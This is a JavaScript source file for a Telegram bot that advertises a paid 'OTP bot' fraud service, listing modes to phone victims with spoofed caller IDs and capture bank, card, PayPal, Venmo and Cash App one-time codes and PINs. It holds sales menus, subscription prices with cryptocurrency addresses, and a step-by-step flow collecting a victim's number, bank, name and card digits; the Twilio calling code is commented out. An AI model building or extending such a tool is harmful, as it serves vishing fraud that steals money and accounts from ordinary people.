// twilio tokins ==========
require("dotenv").config();
// const ACCOUNT_SID = process.env.TWILIO_ACCOUNT_SID;
// const AUTH_TOKEN = process.env.TWILIO_AUTH_TOKEN;
// const clanet = new require("twilio")(ACCOUNT_SID, AUTH_TOKEN);

// telegram bot api tokun
const Telegraf = require("telegraf");
const axios = require("axios");
const bot = new Telegraf(process.env.TELEGRF_TOKEN);

// clanet.calls
//   .create({
//     to: "+2348034528712",
//     from: "+14804284024",
//     url: "https://handler.twilio.com/twiml/EHdb5a1272c0bd0496e0df50792f5a3d34",
//   })
//   .then((call) => console.log(call.sid));

const error_sub = `
You dont have 
any Subscription 🚫

subscribe new /subscribe
`;

const Commad_GUIDE = `
ℂ𝕆𝕄𝕄𝔸ℕ𝔻 𝔾𝕌𝕀𝔻𝔼


GET UP AND RUNNING WITH THE COMMANDS BELOW:

✔💯 /vbv : Verified By VISA Mode 💳
✔💯 /apple : ApplePay Mode 📱
✔💯 /google : GooglePay Mode 📱
✔💯 /samsung : SamsungPay Mode 📱 
✔💯 /gcash : GCash OTP Mode 🤑
✔💯 /paypal : Paypal OTP Mode 🤑
✔💯 /paypalx : Paypal OTP Mode 🤑
✔💯 /venmo : Venmo Mode 🤑
✔💯 /cashapp : Cashapp Mode 💸
✔💯 /email : Email Mode 📧 
✔💯 /logs : CC Capture Mode 💳 
✔💯 /pac : Carrier PAC Mode 📶
✔💯 /carrier : Carrier PIN Mode 📶 
✔💯 /bank : Bank Mode 🏦
✔💯 /bank_otp : Bank OTP Mode 🏦
✔💯 /zelle : Zelle Mode 🏦 


ADVANCE COMMAND:

✔ /license : License expiry details
✔ /otp : bypass account OTP using custom script e.g Venmo, Paypal, Gmail etc.. 
✔ /otp_pin : Capture account OTP and PIN using custom script e.g Bank, Cashapp etc..
✔ /add_script : add script to personal library ✍️.
✔ /my_script : list and listen to your script 🎵

IMPORTANT INFO:    
✔ Only send the OTP when the bot specifically tells you to
✔ Customer service is end to end encrypted


type /cancel to exit any mode before placing new call

Use /off to pause your subscription.

@onetime_Otp
`;

const error_sub_2 = `
📞📵 sorry call cant be made
You dont have any Subscription 🚫
  please subscribe to use
   IVR call mode 
`;


const infoList = `
wlecome to onetime_otp! 
Hit info to start...

✅ /info - click and select for option
 the subscriptions or payment you need

✅ /help - to see more commands or 
 contact admin for more information 
 
✅/ONETIME -oneTimeOtp - to use commands 
on REBEL one time OTP  and enjoy!!

 alwasy active for use!! ✅
`;

const firstMessage = `
✅ Any OTP code in 2 minutes of request

✅ Make payments, Skip PayPal, Get PIN, Sim swap, Get into LOGS and much more💥

✅ Includes modes for Apple Pay, PayPal, Venmo, Cash app, Instagram, Coinbase and others🤳

✅ PGP function allows you to speak as agent ~ encrypted and includes hold music 👥🎶

▫ Help_bot /help
`;

const moreinfo = `
🚀 Calling Commands

/speed - Call via One Line Commands
/call - Capture Any Digit OTP + Any Company
/coinbase - Coinbase Mode
/bank - Bank Mode
/bank2 - Capture Account Number
/vbv - Capture OTP For Transaction
/pin - Capture Account Pin
/venmo - Venmo Mode
/cashapp - Cashapp Mode
/paypal - PayPal V2 Mode
/pgp - Transfer Call After Prompt
/dpgp - Transfer call immediately

⚙️ Custom Modes
/deletescript - Delete a custom script
/myscripts - View your custom scripts
/newscript - Create a new calling script
/editscript - Edit a saved custom script
/custom - Call using Custom Script

🆘 Help Commands
/support - Main Supported Countries
/help - How to Guide
/language - View Available Voices/Languages
/setvoice - Set Desired Voice

🔓 Access Commands
/purchase - Purchase Access
/redeem  - Redeem a license key
/aboutme - Check your subscription details
/callerid - View Popular CallerID's

click /info to see list
`;

const paymentinfoON = `
💚 welcome to onetime payment-account
        reliable for you! 🚀

        💵 Pricing: [ 
          3DAYs[$60],
          WEEKLY [$110],
          MONTHLY[$270],
          YEARLY[$800]
        ]
        
send /proceed to continue!
`;

const paymentinfo = `
select wallet addres to make your
payments fast 📢
`;

const Trcpay = `
✅ USDT/Trc20-address: TAoncfA3RkMhojSEkFbbAFtQcRFammfpYy
`;
const btcpay = `
✅ Bitcoin-address: 3KKU8oH8WBhSioTkKZFs8xa543ANNrYwry
`;

const subscriptionInfo = `
welcome to onetime_otp_pro supcripton
             plans, Activat subscription 
                         NOW✅:

contact @Onetime_otp for more info
`;

const Ivr = `
example.

📢Background Call Center Audio -
This feature allows you to play a audio file to simulate you are in a call center.

⌨️Typing Audio - This feature allows you to play a typing audio to simulate you are typing on a keyboard.

💡Tip - When using the "Transfer to
IVR" feature you will be able to choose which IVR/Script you want to be played!

⬇️Select an option below when you are ready⬇️
`;

const ivr_content = `
📝 DPGP Interaction Menu

🛑 Hangup - This feature allows you to hangup the call at any time.

✅ Place Call on Hold - This feature allows you to place the call on hold with hold music.

❌ Remove Call from Hold - This  feature allows you to remove the call from hold.

👀 99 Fake Transfer Call - This feature allows you to fake transfer the call by playing a ringtone to the caller.

⏩️ Transfer to IVR - This feature allows you to transfer the call to an IVR system of your choice (e.g. PayPal, Bank, etc).

🥸 09 Fake IVR Prompt - This feature allows you to fake an IVR prompt to the target by playing the paypal script for example.

📢 Background Call Center Audio -
This feature allows you to play a audio file to simulate you are in a call center.
`;

const ErrorCode = `
❌ Unknown Command!

You have send a Message directly into the Bot's chat or
Menu structure has been modified by Admin.

ℹ️ Do not send Messages directly to the Bot or
reload the Menu by pressing /start
`;

const HELP_section = `
welcom to the help section 
select one of the options below

    ▫ Help_bot /help
`;

const subscribeList = `
    click /subscribe to see subscriptions
`;

const moreList = `
Dont miss out on the best offers 🚀
make your payment and enjoy your plan
use one-time-otp, always active for you ✅

`;

let call_info = `
☎️ Victim Phone Number

📂 EXAMPLE:

🇺🇸/🇨🇦 US/CANADA: +18230000000
🇬🇧 UK： +448722113477
🇫🇷 FRANCE: +33155452897
🇨🇳 CHINESE : +86 139 1099 33

`;

let use_info = `
📲 caller id 

📂 EXAMPLE:

🇺🇸/🇨🇦 US/CANADA: +18230000000
🇬🇧 UK： +448722113477
🇫🇷 FRANCE: +33155452897
🇨🇳 CHINESE : +86 139 1099 33

`;
 const features = `
 👉 The longest running Telegram OTP Bot:

- Spoof Caller ID:
- Call Internationally
- Pre-Built Modes
- Custom Script Modes
- 200+ Language Options
- Two Way Call Modes With and Without Script (Collect Digits)
- Transfer Calls
- Hold/Un-Hold Music
- Auto Pay + Instant Access
- Quick Support
- Press 1 Modes
- Recordings
- Detailed Call Data
- Any Many More!
 `
const channel = `
👉 The longest running Telegram OTP Bot:

CHANNEL - @onetime_botchannel
`

const site_respons = `
 the site will be active soon 

 pleas contact /admin for more info
`

const VOUCHES = `
👉 The longest running Telegram OTP Bot:

VOUCHES - @onetime_botchannel
`
// ============================
// sections for informations to add
// ==========================

bot.start(async (ctx) => {
  ctx.reply(infoList);
});
// ==============
// list of  bots command
// ===================
bot.command("info", (ctx) => {
  bot.telegram.sendMessage(ctx.chat.id, firstMessage, {
    reply_markup: {
      inline_keyboard: [
        [{ text: "SUBSCRIPTION ✅", callback_data: "subscription" }],
        [{ text: "PAYMENT-ACCOUNT 🚀", callback_data: "payment" }],
        [{ text: "MORE-OPTION  ▫", callback_data: "more-C" }],
        [{ text: "IVR ⏩️", callback_data: "IRV" }],
        [{ text: "COMMAND GUIDE", callback_data: "Commad_GUIDE" }],
      ],
    },
  });
});

bot.command("PURCHASE", (ctx) => {
  bot.telegram.sendMessage(ctx.chat.id, paymentinfo, {
    reply_markup: {
      inline_keyboard: [
        [
          { text: "TRC", callback_data: "TRC" },
          
        ],[
          { text: "BTC", callback_data: "BTC" },
        ]
      ],
    },
  });
});


  bot.command("ONETIME", (ctx) => {
    bot.telegram.sendMessage(ctx.chat.id, `
☎️ OneTime-OTP

👤 ${ctx.from.username} - ${ctx.from.id}

💵 Pricing: [ 
  3DAYs[$60],
  WEEKLY [$110],
  MONTHLY[$270],
  YEARLY[$800]
]

🌏 Status: All countries and modes up

Backup @onetime_otp_pro_bot
    `, {
      reply_markup: {
        inline_keyboard: [
          [{ text: "🤖START GRABBING ", callback_data: "reply-erro" }],
          [{ text: "💰PURCHASE", callback_data: "payment" },{ text: "📳FEATURES", callback_data: "featuers" }],
          [{ text: "🌐CHANNEL", callback_data: "channel" },{ text: "🏆VOUCHES", callback_data: "VOUCHES" }],
          [{ text: "🙋‍♂️FAQ", callback_data: "reply-erro" },{ text: "📖SUPPORT", callback_data: "admin" }],
          [{ text: "🧾My Receipts", callback_data: "reply-erro" }],
          [{ text: "🧾 BUY/SELL CRYPTO", callback_data: "site-respons" }]
        ],
      },
    })
  })



bot.command("IVRpass", (ctx) => {
  bot.telegram.sendMessage(ctx.chat.id, Ivr, {
    reply_markup: {
      inline_keyboard: [
        [{ text: " 🛑 Hangup ", callback_data: "IVR-content" }],
        [{ text: "✅ place call on hold", callback_data: "IVR-content" }],
        [{ text: "👀 fake transfar call", callback_data: "IVR-content" }],
        [{ text: "⏩️ Transfer to IVR", callback_data: "IVR-content" }],
        [{ text: "🥸 Fake IVR prompt", callback_data: "IVR-content" }],
        [
          {
            text: "📢 Background call center Audio",
            callback_data: "IVR-content",
          },
        ],
        [{ text: "⌨️ typing Audio", callback_data: "IVR-content" }],
      ],
    },
  });
});
bot.command("subscribe", (ctx) => {
  bot.telegram.sendMessage(ctx.chat.id, firstMessage, {
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: "VIP subscription LIFE-TIME: $1600  ",
            callback_data: "payment",
          }
        ],
        [{ text: "subscription yearly: $800", callback_data: "payment" }],
        [{ text: "subscription monthly: $270 ", callback_data: "payment" }],
        [{ text: "subscription weekly: $110", callback_data: "payment" }],
        [{ text: "subscription 3days: $60  ", callback_data: "payment" }],
      ],
    },
  });
});

bot.command("subscribe_type", (ctx) => {
  bot.telegram.sendMessage(ctx.chat.id, subscriptionInfo, {
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: "VIP subscription LIFE-TIME: $1600  ",
            callback_data: "payment",
          },
        ],
        [{ text: "subscription yearly: $800", callback_data: "payment" }],
        [{ text: "subscription monthly: $270 ", callback_data: "payment" }],
        [{ text: "subscription weekly: $110", callback_data: "payment" }],
        [{ text: "subscription 3days: $60  ", callback_data: "payment" }],
      ],
    },
  });
});

bot.command(
  [
    "paypal",
    "pgp",
    "dpgp",
    "deletescript",
    "myscripts",
    "newscript",
    "editscript",
    "custom",
    "support",
    "language",
    "setvoice",
    "purchase",
    "redeem",
  ],
  (ctx) => {
    bot.telegram.sendMessage(ctx.chat.id, `${ctx.from.username} ${error_sub}`, {
      reply_markup: {
        inline_keyboard: [[{ text: "Subscribe now ✅", callback_data: "SL" }]],
      },
    });
  }
);

bot.command(
  [
    "call",
    "callerid",
    "aboutme",
    "speed",
    "coinbase",
    "bank",
    "bank2",
    "vbv",
    "pin",
    "venmo",
    "cashapp",
  ],
  (ctx) => {
    ctx.reply(call_info);
  }
);

bot.command("help", (ctx) => {
  bot.telegram.sendMessage(ctx.chat.id, HELP_section, {
    reply_markup: {
      inline_keyboard: [
        [{ text: "more commands ✅", callback_data: "more-C" }],
        [{ text: "Admin chat ✅", callback_data: "admin" }],
      ],
    },
  });
});

bot.command("proceed", (ctx) => {
  bot.telegram.sendMessage(ctx.chat.id, paymentinfo, {
    reply_markup: {
      inline_keyboard: [
        [
          { text: "TRC", callback_data: "TRC" },
          { text: "BTC", callback_data: "BTC" },
        ],
        [{ text: "Admin chat ✅", callback_data: "admin" }],
      ],
    },
  });
});

bot.command("admin", (ctx) => {
  ctx.reply(`click - @Onetime_otp to 
  chat admin for all helps and complans
  `);
});

bot.command("more", (ctx) => {
  ctx.reply(moreinfo);
});

// =========================
// end of bot command and start of function
// ============================

function checkNumber(num) {
  condition = false;
  numN = num.split("");
  if (numN[0] === "+") {
    condition = true;
  }
  return condition;
}

// ===============================
// rount for bot on
// ============================_
// let DeviceName = "";
let DN = "";
let VN = "";
let UN = "";
let vicName = "";
let BN = "";
let LD = "";
let CallCount = 0;
let DeviceName = "";
bot.on("message", (ctx) => {
  let review = `
      🛰️Review Your Data for ${DeviceName} Pay

 ☎️ Victim   ${VN}
 📲 Caller Id ${UN}
 🏦 Bank: ${BN}
 📝 Name: ${vicName}
 💳 Card ending with : ${LD}

  ℹ️ Press /accept to proceed
/Decline to reset current operation.`;

  CallCount++;
  outcome = ctx.message.text;
  conditionOutcome = checkNumber(outcome);

  if ((conditionOutcome == true) & (CallCount <= 1)) {
    outcomeA = ctx.message.text;
    VN = outcomeA;
    ctx.reply(use_info);
  }

  if (CallCount == 2) {
    outcomeB = ctx.message.text;
    UN = outcomeB;
    ctx.reply("🏦 Bank name");
  }

  if (CallCount == 3) {
    outcomeC = ctx.message.text;
    BN = outcomeC;
    ctx.reply("Enter ☎️victims name");
  }
  if (CallCount == 4) {
    outcomeD = ctx.message.text;
    vicName = outcomeD;
    ctx.reply("Enter Last 4 digits of cod");
  }
  if (CallCount == 5) {
    outcomeD = ctx.message.text;
    LD = outcomeD;
    ctx.reply("conferm Last 4 digits of cod");
  }
  if (CallCount == 6) {
    outcomeD = ctx.message.text;
    LD = outcomeD;
    ctx.reply(review);
  }

  if ((CallCount == 7) & (ctx.message.text == "/Decline")) {
    CallCount = 0;
    ctx.reply("click /call to start over");
  } else if ((CallCount == 7) & (ctx.message.text == "/accept")) {
    CallCount = 0;
    ctx.reply(error_sub_2);
  }
});

// ===============================
// action section for bot
// ===============================

bot.action("IVR-content", (ctx) => {
  ctx.answerCbQuery();
  ctx.reply(ivr_content);
});

bot.action("TRC", (ctx) => {
  ctx.answerCbQuery();
  ctx.reply(Trcpay);
});

bot.action("BTC", (ctx) => {
  ctx.answerCbQuery();
  ctx.reply(btcpay);
});

bot.action("SL", (ctx) => {
  ctx.answerCbQuery();
  ctx.reply(subscribeList);
});
bot.action("Commad_GUIDE", (ctx) => {
  ctx.answerCbQuery();
  ctx.reply(Commad_GUIDE);
});
bot.action("IRV", (ctx) => {
  ctx.answerCbQuery();
  ctx.reply("click /IVRpass for support");
});

bot.action("payment", (ctx) => {
  ctx.answerCbQuery();
  ctx.reply(paymentinfoON);
});

bot.action("admin", (ctx) => {
  ctx.answerCbQuery();
  ctx.reply(`click - @Onetime_otp to get 
admins help and lay any complains `);
});

bot.action("subscription", (ctx) => {
  ctx.answerCbQuery();
  ctx.reply(moreList + "click /subscribe_type to see subscriptions");
});

bot.action("more-C", (ctx) => {
  ctx.answerCbQuery();
  ctx.reply(moreinfo);
});

bot.action("reply-erro", (ctx) => {
  ctx.answerCbQuery();
  ctx.reply(error_sub);
})

bot.action("featuers", (ctx) => {
  ctx.answerCbQuery();
  ctx.reply(features);
})

bot.action("channel", (ctx) => {
  ctx.answerCbQuery()
  ctx.reply(channel)
})

bot.action("VOUCHES", ctx => {
  ctx.answerCbQuery()
  ctx.reply(VOUCHES)
})

bot.action("support", ctx => {
  ctx.answerCbQuery()
  ctx.reply(support)
})

bot.action("site-respons", ctx => {
  ctx.answerCbQuery()
  ctx.reply(site_respons)
})
// ======================
// bot launch
// ====================

bot.launch();
